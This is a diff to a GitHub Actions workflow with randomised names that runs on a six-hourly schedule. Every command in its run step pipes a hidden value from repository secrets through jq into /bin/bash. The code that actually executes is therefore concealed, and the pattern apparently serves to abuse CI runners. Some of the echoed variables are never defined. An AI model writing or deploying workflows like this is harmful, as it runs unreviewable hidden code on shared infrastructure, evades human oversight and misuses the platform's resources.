@@ -3,21 +3,19 @@ name: tremblebusy
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 3/6 * * *'
+    - cron: '15 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: tremblebusy
         env:
-          e14769: ${{ secrets.e14769 }}
+          yo18821: ${{ secrets.yo18821 }}
         run: |
-          echo $e14769 | jq -r .tpsod62 | /bin/bash
-          echo $ii8836 | jq -r .tiddf99 | /bin/bash
-          echo $rvwfu7 | jq -r .jma12979 | /bin/bash
-          echo $y9 | jq -r .qubqp2 | /bin/bash
-          echo $lh588 | jq -r .nzvi2 | /bin/bash
-          echo $i3442 | jq -r .tb1 | /bin/bash
-          echo $oeis425 | jq -r .mw3 | /bin/bash
+          echo $yo18821 | jq -r .rpuud29 | /bin/bash
+          echo $vpqu2474 | jq -r .rwtj2 | /bin/bash
+          echo $l73 | jq -r .i109 | /bin/bash
 
